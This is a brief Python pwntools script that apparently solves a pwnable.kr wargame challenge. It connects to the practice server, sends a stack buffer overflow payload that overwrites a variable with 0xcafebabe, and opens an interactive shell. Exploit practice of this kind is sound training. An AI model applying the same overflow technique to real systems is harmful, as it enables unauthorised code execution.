from pwn import *

r = remote("pwnable.kr", 9000)
#r.recvuntil("overflow me :\n")
payload = 'A' * (0x2c + 8) + p32(0xcafebabe)
r.sendline(payload)
r.interactive()
